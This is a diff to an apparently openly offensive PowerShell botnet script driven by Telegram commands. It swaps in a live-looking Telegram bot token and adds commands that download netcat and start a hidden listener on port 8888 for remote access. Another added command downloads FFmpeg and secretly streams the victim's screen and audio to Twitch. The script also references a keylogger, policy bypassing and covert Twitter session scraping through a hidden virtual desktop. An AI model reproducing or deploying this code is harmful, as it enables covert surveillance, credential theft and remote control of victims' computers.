@@ -19,7 +19,7 @@ BOT TELEGRAM:
 ## CONFIG ##
 ############
 
-$BotToken = "690482108:AAGmUpZeugCa2lIRfqDVfMTiRk6i3SRF0ig"
+$BotToken = "693262557:AAE5DLBMbYgPnpT-N6kU-WedyN9Fp39IMJs"
 $ChatID = '-255522090'
 $githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
 
@@ -237,20 +237,6 @@ function mainBrowser {
      }
 }
 
-<#
-function forceHackTwitter {
-    $mainBrowser = mainBrowser
-    Start-Process $mainBrowser -ArgumentList "https://twitter.com/login" -WindowStyle Hidden
-    Start-Sleep -Seconds 2
-    $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('Iniciar sesión en Twitter') 
-    Start-sleep -Seconds 10
-    $wshell.SendKeys("^{s}") 
-    $wshell.AppActivate('Guardar como')
-    Sleep -Seconds 2 
-    $wshell.SendKeys('~') 
-}
-#>
-
 function HackTwitterW10 {
     <#
     Creará un nuevo dekstop virtual e iniciará ahí el firefox y guardará el html, como es un desktop virtual el usuario no se enterará de lo que pasa
@@ -454,6 +440,52 @@ public static void SwitchRightVirtualDesktopInWin10()
     Remove-Item "C:\Users\$env:username\Downloads\w_files.zip"
 }
 
+function netcat {
+    Write-Host "Downloading netcat.."
+    $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
+    $outpath = "C:\Users\$env:username\Documents\nc.zip"
+    $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $url -OutFile $outpath
+    
+    Start-Sleep -Seconds 5
+    Expand-Archive $outpath -DestinationPath $outpathUnzip
+    $args = "-lp 8888"
+    $netcat = $outpathUnzip+"\nc.exe"
+
+    Start-Sleep -Seconds 5
+    Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
+}
+
+function twitch($STREAM_KEY) {
+    Write-Host "Downloading FFmpeg.."
+    $url = "https://ffmpeg.zeranoe.com/builds/win32/static/ffmpeg-20180828-26dc763-win32-static.zip"
+    $outpath = "C:\Users\$env:username\Documents\FFmpeg.zip"
+    $outpathUnzip  = "C:\Users\$env:username\Documents\FFmpeg"
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $url -OutFile $outpath
+
+    Start-Sleep -Seconds 5
+    Expand-Archive $outpath -DestinationPath $outpathUnzip
+
+    $INRES="640x480" # input resolution
+    $OUTRES="640x480" # output resolution
+    $FPS="15" # target FPS
+    $GOP="30" # i-frame interval, should be double of FPS, 
+    $GOPMIN="15" # min i-frame interval, should be equal to fps, 
+    $THREADS="2" # max 6
+    $CBR="1000k" # constant bitrate (should be between 1000k - 3000k)
+    $QUALITY="ultrafast"  # one of the many FFMPEG preset
+    $AUDIO_RATE="44100"
+    #STREAM_KEY="$1" # use the terminal command Streaming streamkeyhere to stream your video to twitch or justin
+    $SERVER="live-mad" # twitch server in Madrid, see http://bashtech.net/twitch/ingest.php to change 
+     
+    $args = "-f x11grab -s $INRES -r $FPS -i :0.0 -f alsa -i pulse -f flv -ac 2 -ar $AUDIO_RATE -vcodec libx264 -g $GOP -keyint_min $GOPMIN -b:v $CBR -minrate $CBR -maxrate $CBR -pix_fmt yuv420p -s $OUTRES -preset $QUALITY -tune film -acodec libmp3lame -threads $THREADS -strict normal -bufsize $CBR 'rtmp://'+$SERVER+'.twitch.tv/app/'+$STREAM_KEY"
+    $FFmpeg = $outpathUnzip+"\ffmpeg-20180828-26dc763-win32-static\bin\ffmpeg.exe"
+
+    Start-Sleep -Seconds 10
+    Start-Process $FFmpeg -ArgumentList $args -WindowStyle Hidden
+}
 
 #####################
 ## BYPASS POLICIES ##
@@ -607,6 +639,13 @@ While ($DoNotExit)  {
       "/keylogger $ipV4 *"{
         $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
         Keylogger $time
+      }
+      "/nc $ipV4"{
+        netcat
+      }
+      "/twitch $ipV4 *"{
+        $STREAM_KEY = ($LastMessageText -split ("/twitch $ipV4 "))[1]
+        twitch $STREAM_KEY
       }
 	  default  {
 	    #The message sent is unknown
